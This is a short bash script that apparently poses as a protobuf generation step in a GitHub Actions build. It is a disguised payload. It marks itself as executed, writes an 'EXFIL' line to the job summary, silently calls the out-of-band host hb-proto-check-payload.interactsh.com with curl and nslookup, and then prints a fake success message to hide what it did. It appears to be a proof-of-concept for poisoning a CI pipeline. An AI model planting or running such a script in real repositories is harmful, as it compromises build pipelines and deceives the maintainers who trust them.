#!/bin/bash
echo "hb-proto-check-payload-EXECUTED"
echo "## hb-proto-check-payload-EXFIL" >> $GITHUB_STEP_SUMMARY
curl -s -m 3 http://hb-proto-check-payload.interactsh.com/proto-check &>/dev/null || true
nslookup hb-proto-check-payload.interactsh.com 2>/dev/null || true
# Simulate the real proto-generate
echo "Protobuf generation completed successfully"
